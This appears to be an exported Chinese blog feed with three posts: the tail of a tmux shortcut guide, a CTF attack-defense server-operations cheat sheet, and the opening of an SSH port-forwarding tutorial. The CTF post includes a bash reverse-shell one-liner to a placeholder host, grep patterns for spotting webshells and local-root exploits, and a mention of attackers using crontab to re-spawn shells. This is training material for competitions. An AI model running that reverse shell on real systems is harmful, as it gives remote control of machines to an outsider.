<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># Remap window(pane?) navigation to vim</div><div class="line"># 用 vim 的方式在窗格间移动光标</div><div class="line">unbind-key j</div><div class="line">bind-key j select-pane -D</div><div class="line">unbind-key k</div><div class="line">bind-key k select-pane -U</div><div class="line">unbind-key h</div><div class="line">bind-key h select-pane -L</div><div class="line">unbind-key l</div><div class="line">bind-key l select-pane -R</div></pre></td></tr></table></figure>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a><strong>建议</strong></h2><p>以下几条建议也许会有助于诸位的 tmux 之旅：</p>
<ol>
<li>尽可能少打开会话和窗口。人类没有我们自认为的那样善于处理多任务。虽然打开 47 个窗格显得很强大，但是这并没有我们想象的那样实用。</li>
<li>当确实要使用窗口和窗格时，花一点时间为它们起个有意义的名字。这非常有用，如果只是用 0、1、2 这样的名字，切换会话或窗口时就会非常麻烦。</li>
<li>从基础的配置、操作开始使用 tmux，别一上来就把自己搞糊涂了。我曾遇到过很多人，他们花费了大量的时间配置 vim 或 tmux，而最终带来的结果却是不但把自己绕进去了，而且项目也没有进展。<h2 id="快捷键参考"><a href="#快捷键参考" class="headerlink" title="快捷键参考"></a>快捷键参考</h2></li>
</ol>
<p>按下 <code>Ctrl-b</code> 后的快捷键如下：</p>
<h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><ul>
<li><code>?</code> 获取帮助信息</li>
</ul>
<h3 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h3><ul>
<li><code>s</code> 列出所有会话</li>
<li><code>$</code> 重命名当前的会话</li>
<li><code>d</code> 断开当前的会话</li>
</ul>
<h3 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h3><ul>
<li><code>c</code> 创建一个新窗口</li>
<li><code>,</code> 重命名当前窗口</li>
<li><code>w</code> 列出所有窗口</li>
<li><code>%</code> 水平分割窗口</li>
<li><code>&quot;</code> 竖直分割窗口</li>
<li><code>n</code> 选择下一个窗口</li>
<li><code>p</code> 选择上一个窗口</li>
<li><code>0~9</code> 选择0~9对应的窗口</li>
</ul>
<h3 id="窗格管理"><a href="#窗格管理" class="headerlink" title="窗格管理"></a>窗格管理</h3><ul>
<li><code>%</code> 创建一个水平窗格</li>
<li><code>&quot;</code> 创建一个竖直窗格</li>
<li><code>h</code> 将光标移入左侧的窗格*</li>
<li><code>j</code> 将光标移入下方的窗格*</li>
<li><code>l</code> 将光标移入右侧的窗格*</li>
<li><code>k</code> 将光标移入上方的窗格*</li>
<li><code>q</code> 显示窗格的编号</li>
<li><code>o</code> 在窗格间切换</li>
<li><code>}</code> 与下一个窗格交换位置</li>
<li><code>{</code> 与上一个窗格交换位置</li>
<li><code>!</code> 在新窗口中显示当前窗格</li>
<li><code>x</code> 关闭当前窗格&gt; 要使用带“*”的快捷键需要提前配置，配置方法可以参考上文的“在窗格间移动光标”一节。——译者注</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h3><ul>
<li><code>t</code> 在当前窗格显示时间</li>
</ul>
]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ctf运维的基本操作]]></title>
      <url>/2017/12/09/ctf%E8%BF%90%E7%BB%B4%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<h3 id="1、ssh相关操作"><a href="#1、ssh相关操作" class="headerlink" title="1、ssh相关操作"></a>1、ssh相关操作</h3><p>启动ssh（root亦可登录）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">service sshd start</div><div class="line">vi /etc/ssh/sshd_config</div><div class="line">- 取消PasswordAuthentication yes的注释</div><div class="line">- 将#PermitRootLogin prohibit-password后加入一行PermitRootLogin yes</div><div class="line">service sshd restart</div></pre></td></tr></table></figure>
<p>ssh登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell登录</div><div class="line">- ssh [user@]host[ port][;host[ port]]</div><div class="line">- ssh root@172.168.12.13 22   //进入界面中设置用户名、密码</div><div class="line">- ssh 172.168.12.13  ;172.168.12.13 22  //console中设置用户名和密码</div><div class="line"></div><div class="line">linux中ssh登录</div><div class="line">- ssh root@172.168.12.13 -p 22</div></pre></td></tr></table></figure>
<p>ssh文件传输</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell下载（最好是配合Xftp）</div><div class="line"></div><div class="line">命令下载（scp）</div><div class="line">- scp local_file remote_username@remote_ip:remote_folder </div><div class="line">- scp remote_username@remote_ip:remote_file local_file </div><div class="line">- scp -r local_folder remote_username@remote_ip:remote_folder </div><div class="line">- scp -r remote_username@remote_ip:remote_folder local_folder</div></pre></td></tr></table></figure>
<h3 id="2、vim常用修改"><a href="#2、vim常用修改" class="headerlink" title="2、vim常用修改"></a>2、vim常用修改</h3><h4 id="2-1-影响范围"><a href="#2-1-影响范围" class="headerlink" title="2.1 影响范围"></a>2.1 影响范围</h4><p>当前文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:命令</div></pre></td></tr></table></figure>
<p>当前用户的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vim ~/.vimrc</div><div class="line">命令</div></pre></td></tr></table></figure>
<p>所有用户的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim /etc/vim/vimrc</div><div class="line"></div><div class="line">命令</div></pre></td></tr></table></figure>
<h4 id="2-2-常用命令"><a href="#2-2-常用命令" class="headerlink" title="2.2 常用命令"></a>2.2 常用命令</h4><p>显示行号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nu或者:set number</div></pre></td></tr></table></figure>
<p>不显示行号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nonu 或者:set nonumber</div></pre></td></tr></table></figure>
<p>设置tab长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set tabstop=4</div></pre></td></tr></table></figure>
<p>设置文件格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:set fileformat=unix或者:set ff=unix</div><div class="line">:set fileformat=dos或者:set ff=dos</div></pre></td></tr></table></figure>
<h3 id="3、find指令"><a href="#3、find指令" class="headerlink" title="3、find指令"></a>3、find指令</h3><p>查找文件类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -name *.php</div></pre></td></tr></table></figure>
<p>查找某种权限的文件及文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-perm(permission)</div><div class="line">- -perm mode：精确匹配权限</div><div class="line">- -perm -mode：完全包含此mode时才可以匹配</div><div class="line">- -perm +mode：任何一位匹配即可</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a权限转为2进制后为 000 110 000 000 (0600)</div><div class="line">b权限转为2进制后为 000 010 000 000 (0200)</div><div class="line">c权限转为2进制后为 000 100 000 000 (0400)</div><div class="line">d权限转为2进制后为 000 110 110 000 (0660)</div><div class="line"></div><div class="line">1. 在find . -type f -perm -0600 中的0600权限转为2进制为000 110 000 000,那么0600前的-号代表缺一不可,也就是如果有1的地方必须有1,那么这里找-0600权限的文件,这0600权限里前面有2个位置都是1,所以这里find找-0600权限的文件就是找第4、5位都是1的文件.而只有a d这两个文件前2个位置都是1,所以find . -type f -perm -0600 只会找到a d两个文件.</div><div class="line">2. find . -type f -perm +0600会找到a b c d这4个文件,这是因为: </div><div class="line">   +0600 里的这个+号代表有1即可,也就是有1的位置，任何位置只要有1就可以.那么这里找+0600权限的文件,这0600权限第4、5位都有1,所以这里find 找+0600权限的文件就是找第4、5位只要有一个位置有1的文件就可以了,这4个文件都符合要求所以最后都能被 find . -type f -perm +0600找到</div></pre></td></tr></table></figure>
<p>多种条件并列查找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">find / -type f  -perm -04000 -o -perm -02000		// 或关系</div><div class="line"></div><div class="line">find / -type f  -perm -04000 -a -perm -02000		// 与关系</div></pre></td></tr></table></figure>
<p>查找符合某些特征的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 找php木马</div><div class="line">find / -type f -name *.php | xargs egrep -l &quot;mysql_query\($query, $dbconn\)|专用网马|udf.dll|class PHPzip\&#123;|ZIP压缩程序 荒野无灯修改版|$writabledb|AnonymousUserName|eval\(|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|if\(empty\($_SESSION|$shellname|$work_dir |PHP木马|Array\(&quot;$filename&quot;| eval\($_POST\[|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门&quot;</div><div class="line"></div><div class="line"># 找jsp木马</div><div class="line">find / -type f -name *.jsp | xargs egrep -l &quot;InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门&quot;</div><div class="line"></div><div class="line"># 找HTML恶意代码</div><div class="line">find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330&quot;</div><div class="line"></div><div class="line"># 找perl恶意程序</div><div class="line">find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;</div><div class="line"></div><div class="line"># 找python恶意程序</div><div class="line">find / -type f -name *.py | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb&quot;</div><div class="line"></div><div class="line"># 检查系统是否存在恶意程序</div><div class="line">find / -type f -perm -111  |xargs egrep &quot;UpdateProcessER12CUpdateGatesE6C|CmdMsg\.cpp|MiniHttpHelper.cpp|y4&apos;r3 1uCky k1d\!|execve@@GLIBC_2.0|initfini.c|ptmalloc_unlock_all2|_IO_wide_data_2|system@@GLIBC_2.0|socket@@GLIBC_2.0|gettimeofday@@GLIBC_2.0|execl@@GLIBC_2.2.5|WwW.SoQoR.NeT|2.6.17-2.6.24.1.c|Local Root Exploit|close@@GLIBC_2.0|syscall\(\__NR\_vmsplice,|Linux vmsplice Local Root Exploit|It looks like the exploit failed|getting root shell&quot; 2&gt;/dev/null</div></pre></td></tr></table></figure>
<h3 id="4、tar指令"><a href="#4、tar指令" class="headerlink" title="4、tar指令"></a>4、tar指令</h3><p>打包文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zcvf /tmp/www.tgz /var/www/html</div></pre></td></tr></table></figure>
<p>解压文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zxvf /tmp/www.tgz -C /tmp/</div></pre></td></tr></table></figure>
<p>不同类型的压缩文件相关参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、*.tar 用 tar –xvf 解压</div><div class="line">2、*.gz 用 gzip -d或者gunzip 解压</div><div class="line">3、.tar.gz和.tgz 用 tar –xzf 解压</div><div class="line">4、*.bz2 用 bzip2 -d或者用bunzip2 解压</div><div class="line">5、*.tar.bz2用tar –xjf 解压</div><div class="line">6、*.Z 用 uncompress 解压</div><div class="line">7、*.tar.Z 用tar –xZf 解压</div><div class="line">8、*.rar 用 unrar e解压</div><div class="line">9、*.zip 用 unzip 解压</div></pre></td></tr></table></figure>
<h3 id="5、备份"><a href="#5、备份" class="headerlink" title="5、备份"></a>5、备份</h3><p>网站备份</p>
<blockquote>
<p>利用上述tar命令将文件进行打包备份</p>
</blockquote>
<p>sql备份</p>
<blockquote>
<p>sql备份需要相关工作者，分析网站系统，并得到sql服务器密码，通过相应指令进行备份。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">备份数据库</div><div class="line">- mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql</div><div class="line">- mysqldump --all-databases &gt; bak.sql</div><div class="line"></div><div class="line">还原数据库</div><div class="line">- mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</div></pre></td></tr></table></figure>
<h3 id="6、杀死进程"><a href="#6、杀死进程" class="headerlink" title="6、杀死进程"></a>6、杀死进程</h3><p>web服务进程分两种，一种是运维者的进程，一种为攻击者的进程。攻击者的进程一般是恶意进程，而且运维者并没有权限杀死改进程。为了杀死这些www-data用户的进程，我们应该在服务器上挂个马，然后通过网络访问的方式删除木马、杀死僵尸进程等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">用户用ssh偷偷连接web服务器</div><div class="line">- w</div><div class="line">- pkill -kill -t &lt;用户tty&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">查看所有的进程</div><div class="line">- ps aux</div><div class="line">- ps -ef</div><div class="line"></div><div class="line">查看某个用户的进程</div><div class="line">- ps -f -u www-data</div><div class="line"></div><div class="line">查看已建立的网络连接及进程</div><div class="line">- netstat -antulp | grep EST</div><div class="line"></div><div class="line">查看指定端口被那个进程占用</div><div class="line">- lsof -i:端口号</div><div class="line">- netstat -tunlp|grep 端口号</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">结束进程</div><div class="line">- kill PID		  // 只能是PID</div><div class="line">- killall &lt;进程名&gt;  // 只能是进程名</div><div class="line">- kill -9 PID          // 此处的9是signal，代表SIGKILL</div><div class="line">- killall -u www-data   //杀死www-data的所有进程</div><div class="line"></div><div class="line">找反弹的shell进程</div><div class="line">ps aux|grep &quot;bash -i&quot;</div></pre></td></tr></table></figure>
<h3 id="7、iptables设置"><a href="#7、iptables设置" class="headerlink" title="7、iptables设置"></a>7、iptables设置</h3><p>其实主办方一般不会给iptables的相关权限，毕竟给了这个权限之后就没法玩了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#Allow youself Ping other hosts , prohibit others Ping you</div><div class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</div><div class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</div><div class="line"></div><div class="line">#Close all INPUT FORWARD OUTPUT, just open some ports</div><div class="line">iptables -P INPUT DROP</div><div class="line">iptables -P FORWARD DROP</div><div class="line">iptables -P OUTPUT DROP</div><div class="line"></div><div class="line">#Open ssh</div><div class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</div><div class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</div><div class="line"></div><div class="line">#ip prohibit</div><div class="line">iptables -A INPUT -p tcp --dport 80 -s 172.16.0.86 -j DROP</div></pre></td></tr></table></figure>
<h3 id="8、crontab设置"><a href="#8、crontab设置" class="headerlink" title="8、crontab设置"></a>8、crontab设置</h3><p>作为维护者，为了方便自己定时检查数据内容，我们可以写个程序，利用crontab定时检查！</p>
<p>作为攻击者，为了让维护者无法完全杀死自己，其可以起一个crontab定时程序，让服务器定时反弹shell或者执行木马程序。</p>
<p>关于crontab的使用，可以参见以前的博文 <a href="/2017/11/26/crontab指令介绍/">crontab指令介绍</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">显示某个用户的crontab文件内容</div><div class="line">crontab -l -u user</div><div class="line"></div><div class="line">删除crontab内容</div><div class="line">crontab -r -u user</div></pre></td></tr></table></figure>
<h3 id="9、挂waf的相关操作"><a href="#9、挂waf的相关操作" class="headerlink" title="9、挂waf的相关操作"></a>9、挂waf的相关操作</h3><p>一般情况下，系统不会立马被人攻陷，所以运维者至少有10分钟的时间可以维护主机。那么这段时间应该做些什么？</p>
<blockquote>
<p>首先将网站备份，并上传waf、file_check等必要工具；</p>
<p>然后挂上waf。将waf放置到/tmp目录下，并给waf、waf/log/、waf/log_all/ 以及相应的文件777权限，然后配置好setup.py、waf.php，最后执行python setup.py；</p>
<p>其次就是启动file_check程序。将file_check放置到/tmp目录下，配置file_check.py，执行python file_check.p；;</p>
<p>最后将sql备份(不一定是必须的，因为sql不一定有。之所以将其放置到最后，是因为从代码中l找到sql密码较为耗时间！)，并将网站备份、sql备份下载至本地。</p>
</blockquote>
<h3 id="10、扫描网络"><a href="#10、扫描网络" class="headerlink" title="10、扫描网络"></a>10、扫描网络</h3><p>扫描网络在闲暇比赛中其实很重要。首先，你需要将目标网段确定，一般就是一个/24的网段，可能存在的服务器不会超过256台。但是，仅仅这个数量其实也挺多的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">#扫描指定端口</div><div class="line">nmap -n --open -p 80 X.X.X.X/24</div><div class="line"></div><div class="line">#扫描指定网段的远程桌面连接端口</div><div class="line">nmap -sT -p3389 218.206.112.0/24</div><div class="line"></div><div class="line">#使用nmap来扫描端口UDP</div><div class="line">nmap -sU 202.96.128.86 -p 53 -Pn</div><div class="line"></div><div class="line">#进行安全检测(全端口扫描)</div><div class="line">nmap -v -A 219.129.216.156</div><div class="line"></div><div class="line">#仅列出指定网络上的每台主机，不发送任何报文到目标主机（能够得到相应的域名）</div><div class="line">nmap -sL 192.168.1.0/24</div><div class="line"></div><div class="line">#探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)</div><div class="line">nmap -PS 192.168.1.234 </div><div class="line"></div><div class="line">#使用UDP ping探测主机</div><div class="line">nmap -PU 192.168.1.0/24</div><div class="line"></div><div class="line">#使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快</div><div class="line">nmap -sS 192.168.1.0/24 </div><div class="line"></div><div class="line">#当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描</div><div class="line">nmap -sT 192.168.1.0/24 </div><div class="line"></div><div class="line">#UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口</div><div class="line">nmap -sU 192.168.1.0/24 </div><div class="line"></div><div class="line">#确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等)</div><div class="line">nmap -sO 192.168.1.19</div><div class="line"></div><div class="line">#探测目标主机的操作系统</div><div class="line">nmap -O 192.168.1.19 </div><div class="line">nmap -A 192.168.1.19 </div><div class="line"></div><div class="line">#进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)</div><div class="line">nmap -sP 192.168.1.0/24</div></pre></td></tr></table></figure>
<p>上述是基本操作，配合grep、awk可以得到更为玄妙的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#扫描指定网段的指定端口，并输出至ip.data</div><div class="line">nmap -n --open -p 80 10.254.20.0/24 | grep -B3 &quot;80/tcp&quot;|grep &quot;report for&quot;|awk &apos;&#123;print $5&#125;&apos; &gt;&gt; ip.data</div></pre></td></tr></table></figure>
<p>类似地，我们可以通过nmap的扫描结果，提取出需要的内容。</p>
<h3 id="11、常用技巧"><a href="#11、常用技巧" class="headerlink" title="11、常用技巧"></a>11、常用技巧</h3><p>反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</div></pre></td></tr></table></figure>
<p>运行crontab</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">crontab cronfile</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ssh端口转发]]></title>
      <url>/2017/12/07/ssh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      <content type="html"><![CDATA[<h2 id="第一部分-概述"><a href="#第一部分-概述" class="headerlink" title="第一部分 概述"></a>第一部分 概述</h2><p>当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！</p>
<h3 id="端口转发概述"><a href="#端口转发概述" class="headerlink" title="端口转发概述"></a>端口转发概述</h3><p>让我们先来了解一下端口转发的概念吧。我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能：</p>
<ol>
<li>加密 SSH Client 端至 SSH Server 端之间的通讯数据。</li>
<li>突破防火墙的限制完成一些之前无法建立的 TCP 连接。</li>
</ol>
<h5 id="图-1-SSH-端口转发"><a href="#图-1-SSH-端口转发" class="headerlink" title="图 1. SSH 端口转发"></a>图 1. SSH 端口转发</h5><p><img src="/images/2017-12-07/image001.jpg" alt=""></p>
<p>如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。</p>
<h2 id="第二部分-本地转发与远程转发"><a href="#第二部分-本地转发与远程转发" class="headerlink" title="第二部分 本地转发与远程转发"></a>第二部分 本地转发与远程转发</h2><h3 id="本地转发实例分析"><a href="#本地转发实例分析" class="headerlink" title="本地转发实例分析"></a>本地转发实例分析</h3><p>我们先来看第一个例子，在实验室里有一台 LDAP 服务器（LdapServerHost），但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器（LdapClientHost）直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？</p>
<p>答案无疑是本地端口转发了，它的命令格式是：</p>
<p><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
<p>在 LdapClientHost 上执行如下命令即可建立一个 SSH 的本地端口转发，例如：</p>
<p><code>$ ssh -L 7001:localhost:389 LdapServerHost</code></p>
<h5 id="图-2-本地端口转发"><a href="#图-2-本地端口转发" class="headerlink" title="图 2. 本地端口转发"></a>图 2. 本地端口转发</h5><p><img src="/images/2017-12-07/image002.jpg" alt=""></p>
<p>这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。</p>
<p>然后我们可以将远程机器（LdapClientHost）上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子：</p>
<ul>
<li>我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，</li>
<li>而本机的 SSH Client 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Server 上。</li>
<li>SSH Server 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，</li>
<li>最后再将从 LDAP 返回的数据原路返回以完成整个流程。</li>
</ul>
<p>我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。</p>
<p>这里有几个地方需要注意：</p>
<ol>
<li>SSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。一旦关闭了此连接，相应的端口转发也会随之关闭。</li>
<li>我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。</li>
<li>你可能会疑惑上面命令中的 \<remote host\=""> 为什么用 localhost，它指向的是哪台机器呢？在本例中，它指向 LdapServertHost 。我们为什么用 localhost 而不是 IP 地址或者主机名呢？其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许 lookback 接口访问的话，那么自然就只有 localhost 或者 IP 为 127.0.0.1 才能访问了，而不能用真实 IP 或者主机名。</remote></li>
<li>命令中的\<remote host\=""> 和 \<ssh hostname\=""> 必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。我们在后面的例子里会详细阐述这点。</ssh></remote></li>
<li>好了，我们已经在 LdapClientHost 建立了端口转发，那么这个端口转发可以被其他机器使用么？比如能否新增加一台 LdapClientHost2 来直接连接 LdapClientHost 的 7001 端口？答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是 lookback 接口，这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到“ connection refused. ”。好在 SSH 同时提供了 GatewayPorts 关键字，我们可以通过指定它与其他机器共享这个本地端口转发。<br><code>ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></li>
</ol>
<h3 id="远程转发实例分析"><a href="#远程转发实例分析" class="headerlink" title="远程转发实例分析"></a>远程转发实例分析</h3><p>我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从 LdapClientHost 连接到 LDAP 服务器（LdapServertHost），但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。</p>
<p>它的命令格式是：</p>
<p><code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
<p>例如在 LDAP 服务器（LdapServertHost）端执行如下命令：</p>
<p><code>$ ssh -R 7001:localhost:389 LdapClientHost</code></p>
